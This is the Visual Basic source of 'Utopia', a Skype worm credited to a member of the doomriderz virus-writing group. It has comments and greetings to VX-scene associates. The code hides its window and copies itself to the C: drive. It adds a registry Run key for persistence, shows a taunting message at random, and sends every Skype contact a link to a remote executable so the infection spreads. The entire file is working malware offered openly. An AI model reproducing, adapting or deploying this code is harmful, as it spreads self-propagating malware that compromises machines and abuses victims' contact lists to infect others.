   VERSION 5.00
   Begin VB.Form Form1
      Caption         =   "Utopia failed ..."
      ClientHeight    =   1320
      ClientLeft      =   60
      ClientTop       =   450
      ClientWidth     =   3585
      LinkTopic       =   "Form1"
      ScaleHeight     =   1320
      ScaleWidth      =   3585
      StartUpPosition =   3  'Windows Default
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   ' utopia skype worm by [WarGame / doomriderz]
   ' This is the first worm using Skype4COM interface to
   ' access skype and spread. Nothing of special, it only
   ' shows you how it is simple to use this COM interface
   ' greetz to all doomriderz and my great friends:
   ' izee: you rock man!
   ' nibble: keep on coding!
   ' sk0r: c++ is a good language :)
   ' and other people: saec, synge, retr0 and everybody in VX
   ' Note: I do not like vb much :|

   Private Sub Form_Load()
   Dim payload As Integer
   Dim reg_fd As Long
   Dim ret As Long
   Dim path As String

   On Error Resume Next

   ' hide form
   Form1.Hide

   'skype present ?
   ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\Skype\Phone", 0, KEY_QUERY_VALUE, reg_fd)
   If Not (ret = ERROR_SUCCESS) Then
   ExitProcess 0
   End If
   RegCloseKey reg_fd

   ' usual shit ... autocopy ... autostart ...
   FileCopy App.path + "\" + App.EXEName + ".exe", "C:\skypeme.exe"
   RegOpenKeyEx HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE, reg_fd
   path = "C:\skypeme.exe" & vbNullChar
   RegSetValueEx reg_fd, "skypeme2", 0, REG_SZ, ByVal path, Len(path)
   RegCloseKey reg_fd

   ' connected?
   Do While InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0&) = 0
   Sleep 300000 ' every 5 minutes
   Loop

   ' the real worm part
   Randomize

   'payload
   payload = Rnd(30)
   If payload = 5 Then
   MsgBox "School suckz!!! The best people: AntoKr_, Mike_Hood, Machiavel_, ^Alex, Darkv0id !", vbInformation, "Utopia by [WarGame/doomriderz]"
   ShellExecute 0, "Open", "http://doomriderz.co.nr", vbNullString, vbNullString, SW_NORMAL
   End If

   ' try to access skype
   Set skype_fd = CreateObject("Skype4COM.Skype")
   skype_fd.Client.Start
   skype_fd.Attach

   ' send the infamous link to contact list
   For Each user In skype_fd.Friends
   skype_fd.SendMessage user.Handle, "http://www.pugnax.co.uk/wargame/utopy.exe"
   Next

   ExitProcess 0  'simply exit

   End Sub
